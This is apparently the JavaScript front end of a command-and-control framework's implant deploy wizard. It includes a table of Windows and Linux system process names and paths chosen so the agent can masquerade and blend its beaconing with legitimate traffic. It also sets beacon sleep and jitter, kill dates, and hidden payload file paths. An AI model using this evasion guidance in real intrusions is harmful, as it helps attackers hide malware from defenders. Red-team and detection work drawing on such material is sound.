    const allTags = ['all', ...new Set(entries.flatMap(e => e.tags))];

    const filtersEl = document.getElementById('label-filters');
    filtersEl.innerHTML = '';
    allTags.forEach(tag => {
      const btn = document.createElement('button');
      btn.className = `opsec-filter-btn${tag === _labelActiveTag ? ' active' : ''}`;
      btn.textContent = tag === 'all' ? 'All' : (_LABEL_TAGS[tag] || tag);
      btn.addEventListener('click', () => { _labelActiveTag = tag; _renderLabelGrid(); });
      filtersEl.appendChild(btn);
    });

    const filtered = _labelActiveTag === 'all' ? entries : entries.filter(e => e.tags.includes(_labelActiveTag));
    const grid = document.getElementById('label-grid');
    grid.innerHTML = '';
    filtered.forEach(entry => {
      const card = document.createElement('div');
      card.className = 'opsec-card';
      const tagHtml = entry.tags.map(t => `<span class="opsec-tag">${escHtml(_LABEL_TAGS[t] || t)}</span>`).join('');
      card.innerHTML = `
        <div class="opsec-card-main">
          <div class="opsec-card-header">
            <span class="opsec-card-name">${escHtml(entry.name)}</span>
            <div class="opsec-card-tags">${tagHtml}</div>
          </div>
          <div class="opsec-card-desc">${escHtml(entry.desc)}</div>
        </div>
        <div class="opsec-card-action">Use →</div>`;
      card.addEventListener('click', () => {
        const inp = document.getElementById('ch-session-label') || document.getElementById('cfg-label');
        if (inp) { inp.value = entry.name; inp.dispatchEvent(new Event('input')); }
        document.getElementById('label-overlay')?.classList.remove('open');
      });
      grid.appendChild(card);
    });
  }

  /* ── OPSEC name suggestion modal ──────────────────────────────────────────── */
  const _OPSEC_NAMES = {
    windows: [
      { name: 'RuntimeBroker',         ext: '.exe', folder: '%SystemRoot%\\System32',         desc: 'Manages permissions for Microsoft Store apps. Always present on Win10+, single instance expected.',                           tags: ['generic','office'] },
      { name: 'svchost',               ext: '.exe', folder: '%SystemRoot%\\System32',         desc: 'Service Host process. Dozens of legitimate instances run at all times — extra instances rarely audited.',                    tags: ['generic'] },
      { name: 'OneDriveStandaloneUpdater', ext: '.exe', folder: '%LocalAppData%\\Microsoft\\OneDrive', desc: 'OneDrive background updater. Expected to run silently on corporate endpoints with O365.',               tags: ['office','m365'] },
      { name: 'MicrosoftEdgeUpdate',   ext: '.exe', folder: '%LocalAppData%\\Microsoft\\EdgeUpdate', desc: 'Edge auto-update helper. Runs periodically and makes HTTPS requests — blends with C2 beaconing.',              tags: ['generic','browser'] },
      { name: 'Teams',                 ext: '.exe', folder: '%LocalAppData%\\Microsoft\\Teams\\current', desc: 'Microsoft Teams client. Heavy network user, expected on all corporate endpoints.',                        tags: ['office','m365'] },
      { name: 'SearchIndexer',         ext: '.exe', folder: '%SystemRoot%\\System32',         desc: 'Windows Search indexing service. Always present, makes filesystem and network queries.',                               tags: ['generic'] },
      { name: 'WmiPrvSE',              ext: '.exe', folder: '%SystemRoot%\\System32\\wbem',   desc: 'WMI Provider Host. Short-lived instances are normal; blends in noisy WMI environments.',                              tags: ['generic','admin'] },
      { name: 'dllhost',               ext: '.exe', folder: '%SystemRoot%\\System32',         desc: 'COM Surrogate host. Spawned by Explorer for thumbnail/preview tasks; multiple instances are normal.',                  tags: ['generic'] },
      { name: 'conhost',               ext: '.exe', folder: '%SystemRoot%\\System32',         desc: 'Console Window Host. Accompanies every console process — very high volume, rarely scrutinised alone.',                tags: ['generic'] },
      { name: 'taskhostw',             ext: '.exe', folder: '%SystemRoot%\\System32',         desc: 'Task Host Window. Runs scheduled tasks at logon/logoff; short lifecycle masks beaconing gaps.',                       tags: ['generic'] },
      { name: 'wp_api_service',        ext: '.exe', folder: '%ProgramFiles%\\WordPress\\bin', desc: 'Fictional WordPress API helper. Convincing on web servers running WP; unusual on workstations.',                     tags: ['web','wordpress'] },
      { name: 'nginx_helper',          ext: '.exe', folder: '%ProgramFiles%\\nginx',          desc: 'Fictional nginx helper utility. Plausible on Windows servers running nginx as a reverse proxy.',                      tags: ['web','nginx'] },
      { name: 'MSSqlConnector',        ext: '.exe', folder: '%ProgramFiles%\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn', desc: 'Fictional MSSQL connector. Blends in on database servers.',             tags: ['db','mssql'] },
      { name: 'vmtoolsd',              ext: '.exe', folder: '%ProgramFiles%\\VMware\\VMware Tools', desc: 'VMware Tools daemon. Present on every VMware guest — very common in enterprise environments.',                  tags: ['vm','generic'] },
      { name: 'GoogleUpdate',          ext: '.exe', folder: '%LocalAppData%\\Google\\Update', desc: 'Google Chrome/Workspace updater. Makes HTTPS requests on a timer; indistinguishable from C2 beacon.',                tags: ['browser','generic'] },
    ],
    linux: [
      { name: 'systemd-resolved',  ext: '', folder: '/usr/lib/systemd',      desc: 'Systemd DNS resolver daemon. Always running on modern distros; DNS queries blend with C2 traffic.',                                  tags: ['generic','systemd'] },
      { name: 'dbus-daemon',       ext: '', folder: '/usr/bin',              desc: 'D-Bus message bus. Present on every desktop/server Linux install; multiple instances normal.',                                         tags: ['generic','systemd'] },
      { name: 'NetworkManager',    ext: '', folder: '/usr/sbin',             desc: 'Network management daemon. Makes periodic connectivity checks — natural cover for HTTP beaconing.',                                    tags: ['generic','network'] },
      { name: 'update-notifier',   ext: '', folder: '/usr/lib/update-notifier', desc: 'Package update checker. Runs periodically and contacts remote servers — ideal beacon cover.',                                     tags: ['generic','ubuntu'] },
      { name: 'apt-config',        ext: '', folder: '/usr/bin',              desc: 'APT configuration utility. Short-lived invocations expected on Debian/Ubuntu; unremarkable in logs.',                                 tags: ['generic','debian'] },
      { name: 'php-fpm',           ext: '', folder: '/usr/sbin',             desc: 'PHP FastCGI Process Manager. Running on any web server with PHP; HTTPS egress expected.',                                             tags: ['web','php','wordpress'] },
      { name: 'nginx',             ext: '', folder: '/usr/sbin',             desc: 'Nginx web server binary. Expected to run as a daemon on web servers; network activity unremarkable.',                                 tags: ['web','nginx'] },
      { name: 'apache2',           ext: '', folder: '/usr/sbin',             desc: 'Apache HTTP server. Ubiquitous on Linux web servers; child processes and network I/O are expected.',                                  tags: ['web','apache'] },
      { name: 'mysqld_safe',       ext: '', folder: '/usr/bin',              desc: 'MySQL safe wrapper. Present on DB servers; spawns child processes and makes socket connections.',                                      tags: ['db','mysql'] },
      { name: 'postgres',          ext: '', folder: '/usr/lib/postgresql/14/bin', desc: 'PostgreSQL server process. Normal on DB servers; network-listening process that matches C2 behavior.',                          tags: ['db','postgresql'] },
      { name: 'vmtoolsd',          ext: '', folder: '/usr/bin',              desc: 'VMware Tools daemon. Running on every VMware Linux guest; completely unremarkable.',                                                   tags: ['vm','generic'] },
      { name: 'java',              ext: '', folder: '/usr/bin',              desc: 'JVM binary. Expected on servers running Tomcat, Jenkins, Elasticsearch etc; long-lived process normal.',                               tags: ['web','java','generic'] },
      { name: 'python3',           ext: '', folder: '/usr/bin',              desc: 'Python interpreter. Ubiquitous on modern Linux; can be a long-running process without raising suspicion.',                            tags: ['generic','dev'] },
      { name: 'containerd-shim',   ext: '', folder: '/usr/bin',              desc: 'Container runtime shim. Expected on Docker/k8s hosts; network activity is inherent to containers.',                                  tags: ['container','generic'] },
    ],
  };

  const _OPSEC_TAGS = {
    generic: 'Generic', office: 'Office/M365', web: 'Web Server', wordpress: 'WordPress',
    nginx: 'nginx', apache: 'Apache', db: 'Database', mssql: 'MSSQL', mysql: 'MySQL',
    postgresql: 'PostgreSQL', php: 'PHP', java: 'Java', browser: 'Browser',
    m365: 'M365', admin: 'Admin', systemd: 'systemd', network: 'Network',
    ubuntu: 'Ubuntu/Debian', debian: 'Debian', vm: 'VM Guest', container: 'Container', dev: 'Dev',
  };

  let _opsecActiveTab = 'windows';
  let _opsecActiveTag = 'all';

  function _openOpsecModal() {
    let overlay = document.getElementById('opsec-overlay');
    if (!overlay) {
      overlay = document.createElement('div');
      overlay.id = 'opsec-overlay';
      overlay.className = 'modal-overlay';
      overlay.innerHTML = `
        <div class="modal opsec-modal" id="opsec-modal" style="max-width:760px;width:95vw">
          <div class="modal-header">
            <span class="modal-title">💡 OPSEC Name Suggestions</span>
            <button class="modal-close" id="opsec-close">✕</button>
          </div>
          <div class="opsec-tabs">
            <button class="opsec-tab active" data-tab="windows">🪟 Windows</button>
            <button class="opsec-tab" data-tab="linux">🐧 Linux</button>
          </div>
          <div class="opsec-filters" id="opsec-filters"></div>
          <div class="opsec-list" id="opsec-grid"></div>
        </div>`;
      document.body.appendChild(overlay);
      document.getElementById('opsec-close').addEventListener('click', () => { overlay.classList.remove('open'); });
      overlay.addEventListener('click', e => { if (e.target === overlay) overlay.classList.remove('open'); });
      overlay.querySelectorAll('.opsec-tab').forEach(btn => {
        btn.addEventListener('click', () => {
          overlay.querySelectorAll('.opsec-tab').forEach(b => b.classList.remove('active'));
          btn.classList.add('active');
          _opsecActiveTab = btn.dataset.tab;
          _opsecActiveTag = 'all';
          _renderOpsecGrid();
        });
      });
    }
    _opsecActiveTab = 'windows';
    _opsecActiveTag = 'all';
    overlay.querySelectorAll('.opsec-tab').forEach(b => b.classList.toggle('active', b.dataset.tab === 'windows'));
    overlay.classList.add('open');
    _renderOpsecGrid();
  }

  function _renderOpsecGrid() {
    const entries = _OPSEC_NAMES[_opsecActiveTab] || [];
    const allTags = ['all', ...new Set(entries.flatMap(e => e.tags))];

    const filtersEl = document.getElementById('opsec-filters');
    filtersEl.innerHTML = '';
    allTags.forEach(tag => {
      const btn = document.createElement('button');
      btn.className = `opsec-filter-btn${tag === _opsecActiveTag ? ' active' : ''}`;
      btn.textContent = tag === 'all' ? 'All' : (_OPSEC_TAGS[tag] || tag);
      btn.addEventListener('click', () => {
        _opsecActiveTag = tag;
        _renderOpsecGrid();
      });
      filtersEl.appendChild(btn);
    });

    const filtered = _opsecActiveTag === 'all' ? entries : entries.filter(e => e.tags.includes(_opsecActiveTag));
    const grid = document.getElementById('opsec-grid');
    grid.innerHTML = '';
    filtered.forEach(entry => {
      const card = document.createElement('div');
      card.className = 'opsec-card';
      const tagHtml = entry.tags.map(t => `<span class="opsec-tag">${escHtml(_OPSEC_TAGS[t] || t)}</span>`).join('');
      card.innerHTML = `
        <div class="opsec-card-main">
          <div class="opsec-card-header">
            <span class="opsec-card-name">${escHtml(entry.name)}${escHtml(entry.ext)}</span>
            <div class="opsec-card-tags">${tagHtml}</div>
          </div>
          <div class="opsec-card-folder">${escHtml(entry.folder)}</div>
          <div class="opsec-card-desc">${escHtml(entry.desc)}</div>
        </div>
        <div class="opsec-card-action">Use →</div>`;
      card.addEventListener('click', () => {
        if (_opsecActiveTab === 'windows') {
          const inp = document.getElementById('cfg-agent_name_win');
          if (inp) { inp.value = entry.name; inp.dispatchEvent(new Event('input')); }
        } else {
          const inp = document.getElementById('cfg-agent_name_linux');
          if (inp) { inp.value = entry.name; inp.dispatchEvent(new Event('input')); }
        }
        document.getElementById('opsec-overlay')?.classList.remove('open');
      });
      grid.appendChild(card);
    });
  }

  function _collectStep2() {
    _cmVals = {};
    const checkedMode = document.querySelector('input[name="cfg-mode"]:checked');
    if (checkedMode) _cmVals.mode = checkedMode.value;
    const sleep  = document.getElementById('cfg-base_sleep');
    const jitter = document.getElementById('cfg-jitter_percent');
    if (sleep)  _cmVals.base_sleep     = parseInt(sleep.value, 10)  || 30;
    if (jitter) _cmVals.jitter_percent = parseInt(jitter.value, 10) || 30;
    const kd = document.getElementById('cfg-kill_date');
    if (kd) _cmVals.kill_date = kd.value || '';
    const ws = document.getElementById('cfg-window_start');
    const we = document.getElementById('cfg-window_end');
    if (ws) _cmVals.window_start = ws.value || '';
    if (we) _cmVals.window_end   = we.value || '';
    const bpl = document.getElementById('cfg-blob_path_linux');
    const bpw = document.getElementById('cfg-blob_path_win');
    if (bpl) _cmVals.blob_path_linux = bpl.value || '${HOME}/.config/pulse/.pid';
    if (bpw) _cmVals.blob_path_win   = bpw.value || '%APPDATA%\\Microsoft\\Windows\\Themes\\.ddb';
    const dbg = document.getElementById('cfg-debug_mode');
    if (dbg) _cmVals.debug_mode = dbg.checked;
    _cmVals.session_label    = _creds.session_label || '';
    _cmVals.agent_name_win   = document.getElementById('cfg-agent_name_win')?.value?.trim()   || '';
    _cmVals.agent_name_linux = document.getElementById('cfg-agent_name_linux')?.value?.trim() || '';
  }

  /* ═══════════════════════════════════════════════════════════════════════════
     STEP 3 — Build (SSE stream)
  ═══════════════════════════════════════════════════════════════════════════ */
  const _PROG = ['ps-validate', 'ps-keygen', 'ps-build', 'ps-upload', 'ps-finalize'];

  function _advanceProg() {
    if (_progIdx > 0) {
      const prev = document.getElementById(_PROG[_progIdx - 1]);
      if (prev) prev.className = 'prog-step done';
    }
    const cur = document.getElementById(_PROG[_progIdx]);
    if (cur) cur.className = 'prog-step active';
    _progIdx = Math.min(_progIdx + 1, _PROG.length);
  }

  function _allProgDone() {
    _PROG.forEach(id => { const e = document.getElementById(id); if (e) e.className = 'prog-step done'; });
  }

  function _progError() {
    const id = _PROG[Math.max(0, _progIdx - 1)];
    const e  = document.getElementById(id);
    if (e) e.className = 'prog-step error';
  }

  function _renderStep3() {
    const body = _body();
    body.innerHTML = `
      <div class="step4-wrap">
        <div class="progress-steps" id="prog-steps">
          <div class="prog-step pending" id="ps-validate"><div class="ps-icon"></div><div>Validating configuration</div></div>
          <div class="prog-step pending" id="ps-keygen"  ><div class="ps-icon"></div><div>Key generation</div></div>
          <div class="prog-step pending" id="ps-build"   ><div class="ps-icon"></div><div>Cargo build</div></div>
          <div class="prog-step pending" id="ps-upload"  ><div class="ps-icon"></div><div>Uploading to cloud</div></div>
          <div class="prog-step pending" id="ps-finalize"><div class="ps-icon"></div><div>Finalizing session</div></div>
        </div>
        <div class="build-log" id="build-log"><span class="bl-info">Starting deploy…</span>
</div>
      </div>`;
    _setPrev(false); _setNext(false, '⋯ Building');
    _startDeploy();
  }

  function _appendLog(line) {
    const log = document.getElementById('build-log');
    if (!log) return;
    let cls = 'bl-default';
    if      (/^✓|^\[OK\]|^Finished/i.test(line))          cls = 'bl-ok';
    else if (/^✗|^ERROR:/i.test(line))                     cls = 'bl-err';
    else if (/^⚠|^warn/i.test(line))                       cls = 'bl-warn';
    else if (/^=== STEP|^===|^==>/i.test(line))            cls = 'bl-step';
    else if (/^\s*$/.test(line))                            return;
    else if (/^\[deploy\]|^ℹ/i.test(line))                 cls = 'bl-info';
    else if (/[┌┐└┘├┤┬┴┼─│╔╗╚╝╠╣╦╩╬═║█░──]/.test(line)) cls = 'bl-box';
    const span = document.createElement('span');
    span.className = cls;
    span.textContent = line;
    log.appendChild(span);
    log.appendChild(document.createTextNode('\n'));
    log.scrollTop = log.scrollHeight;
    if (/^=== STEP/i.test(line)) _advanceProg();
  }

  async function _startDeploy() {
    _progIdx = 0;
    _advanceProg();

    const config = Object.assign({}, _creds, _cmVals);
    const deployBody = { provider: _provId, config };
    // When using a saved profile, send profile_id so the server resolves
    // credentials from disk — never send secrets through the browser.
    if (_selectedProfId) deployBody.profile_id = _selectedProfId;
    if (_creds._label)   deployBody.cred_label  = _creds._label;
    try {
      const r = await API.startDeploy(deployBody);
      _taskId = r.task_id;
    } catch (e) {
      _appendLog(`✗ Deploy failed to start: ${e.message}`);
      _progError();
      _setNext(false, 'Failed');
      Toast.error('Deploy failed', e.message);
      return;
    }

    let _sseDone = false;

    _sse = new EventSource(API.deployStreamUrl(_taskId));

    _sse.onmessage = (ev) => {
      if (!ev.data || !ev.data.trim()) return;
      let data;
      try { data = JSON.parse(ev.data); } catch { _appendLog(ev.data); return; }
      if (data.line) _appendLog(data.line);
    };

    _sse.addEventListener('done', (ev) => {
      _sseDone = true;
      let data = {};
      try { data = JSON.parse(ev.data); } catch {}
      if (_sse) { _sse.close(); _sse = null; }

      if (data.status === 'done') {
        _allProgDone();
        _appendLog('✓ Deploy complete!');
        _setNext(true, 'Done ✓');
        const btn = _btnNext();
        if (btn) { btn.classList.add('btn-success'); btn.onclick = () => close(); }
        _taskId = null;
      } else {
        _progError();
        const msg = data.message || 'Unknown error';
        _appendLog(`✗ Deploy failed: ${msg}`);
        _setNext(false, 'Failed');
        Toast.error('Deploy failed', msg);
      }
    });

    _sse.onerror = () => {
      if (_sseDone) return;
      if (_sse) { _sse.close(); _sse = null; }
      _progError();
      _appendLog('✗ Stream connection lost — check server logs');
      _setNext(false, 'Failed');
    };
  }

  /* ── Navigation ──────────────────────────────────────────────────────────── */
  async function _goNext() {
    if (_step === 0) {
      if (!_provId) return;
      /* Await the fetch started on card-click — instant if already resolved,
         otherwise waits for the in-flight request. Prevents the race where
         the user clicks Next before the background fetch completes. */
      _setNext(false, '…');
      await _fetchProfiles(_provId);
      _selectedProfId = null;
      _credMode = _hasSavedProfiles(_provId) ? 'pick' : 'new';
      _step = 1;
      _updateStepIndicators();
      _renderCurrentStep();
      return;
    }

    /* Step 1 sub-states */
    if (_step === 1) {
      if (_credMode === 'pick') {
        if (!_selectedProfId) {
          Toast.warning('No profile selected', 'Select a saved profile or click "+ New credentials".');
          return;
        }
        const prof = _profilesFor(_provId).find(p => p.id === _selectedProfId);
        if (!prof) return;
        // Credentials are never copied to JS memory — server resolves them from disk
        // via profile_id at deploy time.
        _creds    = {};
        _credMode = 'channel';
        _renderCurrentStep();
        return;
      }
      if (_credMode === 'channel') {
        _collectChannelFields();          // merge channel paths into _creds
        _stopOAuth();
        /* fall through to increment step */
      } else {
        /* credMode === 'new' */
        _collectStep1();
        _stopOAuth();
      }
    }

    if (_step === 2) _collectStep2();
    _step++;
    _updateStepIndicators();
    _renderCurrentStep();
  }

  function _goPrev() {
    if (_step === 0) return;

    if (_step === 1) {
      if (_credMode === 'channel') {
        /* channel form → back to picker */
        _credMode     = 'pick';
        _selectedProfId = null;
        _renderCurrentStep();
        return;
      }
      if (_credMode === 'new' && _hasSavedProfiles(_provId)) {
        /* new-form → back to picker */
        _credMode = 'pick';
        _stopOAuth();
        _renderCurrentStep();
        return;
      }
      _stopOAuth();
      _credMode = null;
    }

    _step--;
    _updateStepIndicators();
    _renderCurrentStep();
  }

  function _renderCurrentStep() {
    switch (_step) {
      case 0: _renderStep0(); break;
      case 1: _renderStep1(); break;
      case 2: _renderStep2(); break;
      case 3: _renderStep3(); break;
    }
  }

  /* ── open / close ────────────────────────────────────────────────────────── */
  function open() {
    _step           = 0;
    _creds          = {};
    _cmVals         = {};
    _taskId         = null;
    _progIdx        = 0;
    _credMode       = null;
    _selectedProfId = null;
    _profileCache   = {};   // flush — server may have new profiles since last open
    _profileFetch   = {};   // flush pending promises too
    if (_sse) { _sse.close(); _sse = null; }

    const nb = _btnNext();
    if (nb) { nb.onclick = null; nb.classList.remove('btn-success'); }

    _updateStepIndicators();
    _renderStep0();
    Modal.open('deploy-modal', { nonDismissible: true });
  }

  async function close(cancelTask = false) {
    if (_step === 3 && _taskId && cancelTask === false) {
      const choice = await _askDeployAction();
      if (choice === 'stay') return;
      cancelTask = (choice === 'abort');
    }
    _stopOAuth();
    if (_sse) { _sse.close(); _sse = null; }
    if (_taskId) {
      if (cancelTask) {
        try { await API.cancelDeploy(_taskId); } catch (_) {}
        Toast.warning('Deploy aborted', 'Artifacts and cloud files are being rolled back.');
      } else {
        Toast.info('Deploy in background', 'The deploy continues running — session will appear when ready.');
      }
      _taskId = null;
    }
    Modal.close('deploy-modal');
  }

  function _askDeployAction() {
    return new Promise(resolve => {
      let overlay = document.getElementById('deploy-action-overlay');
      if (overlay) overlay.remove();
      overlay = document.createElement('div');
      overlay.id = 'deploy-action-overlay';
      overlay.className = 'modal-overlay open';
      overlay.style.zIndex = '9999';
      overlay.innerHTML = `
        <div class="modal" style="max-width:420px;width:90vw;padding:1.5rem">
          <div class="modal-header" style="margin-bottom:.8rem">
            <span class="modal-title">Deploy in progress</span>
          </div>
          <p style="font-size:.82rem;color:var(--text-muted);margin:0 0 1.2rem">
            The deploy is still running. What would you like to do?
          </p>
          <div style="display:flex;flex-direction:column;gap:.5rem">
            <button class="btn-deploy-action" id="da-bg"
              style="padding:.55rem .8rem;border-radius:6px;border:1px solid var(--border);background:var(--surface-bright);color:var(--text);cursor:pointer;text-align:left">
              <strong>Continue in background</strong>
              <div style="font-size:.72rem;color:var(--text-muted);margin-top:.15rem">Session will appear when ready</div>
            </button>
            <button class="btn-deploy-action" id="da-abort"
              style="padding:.55rem .8rem;border-radius:6px;border:1px solid var(--accent);background:rgba(255,60,60,.08);color:var(--accent-bright);cursor:pointer;text-align:left">
              <strong>Abort deploy</strong>
              <div style="font-size:.72rem;color:var(--text-muted);margin-top:.15rem">Cancel build, remove generated files and cloud artifacts</div>
            </button>
            <button class="btn-deploy-action" id="da-stay"
              style="padding:.45rem .8rem;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text-muted);cursor:pointer;text-align:center;font-size:.78rem">
              Stay on this page
            </button>
          </div>
        </div>`;
      document.body.appendChild(overlay);
      const cleanup = () => { overlay.remove(); };
      document.getElementById('da-bg').addEventListener('click', () => { cleanup(); resolve('background'); });
      document.getElementById('da-abort').addEventListener('click', () => { cleanup(); resolve('abort'); });
      document.getElementById('da-stay').addEventListener('click', () => { cleanup(); resolve('stay'); });
      overlay.addEventListener('click', e => { if (e.target === overlay) { cleanup(); resolve('stay'); } });
    });
  }

  /* ── init ────────────────────────────────────────────────────────────────── */
  function init() {
    const m = _modal();
    if (!m) return;

    API.providers().then(data => {
      _providers = Object.fromEntries((data.providers || []).map(p => [p.id, p]));
      _cmFields  = data.common_fields || [];
    }).catch(() => {});

    _btnPrev()?.addEventListener('click', _goPrev);
    _btnNext()?.addEventListener('click', () => { if (_step < STEPS.length - 1) _goNext(); });

    document.getElementById('deploy-close')?.addEventListener('click', () => close());

    document.getElementById('guide-close')?.addEventListener('click', () => Modal.close('guide-modal'));
    document.getElementById('guide-ok')?.addEventListener('click',    () => Modal.close('guide-modal'));

    m.addEventListener('click', (e) => {
      if (e.target !== m) return;
      close();
    });

    document.getElementById('btn-deploy')?.addEventListener('click', open);
  }

  /* ── beacon stepper helpers (called from inline onclick) ────────────────── */
  function _stepSleep(delta) {
    const el = document.getElementById('cfg-base_sleep');
    if (!el) return;
    el.value = Math.max(5, Math.min(86400, (parseInt(el.value) || 30) + delta));
  }

  function _stepJitter(delta) {
    const el = document.getElementById('cfg-jitter_percent');
    if (!el) return;
    el.value = Math.max(0, Math.min(100, (parseInt(el.value) || 30) + delta));
  }

  /* ── public API ──────────────────────────────────────────────────────────── */
  return {
    init, open, close,
    _stepSleep, _stepJitter,
    getProviders:    () => ({ ..._providers }),
    hasSavedCreds:   _hasCreds,
    loadSavedCreds:  _loadCreds,
    clearSavedCreds: _clearCreds,
    /* Profile-level access for Settings modal */
    fetchProfileList:  _fetchProfiles,      // async
    profilesFor:       _profilesFor,        // sync from cache
    removeProfile:     _deleteProfileRemote, // async
  };
})();
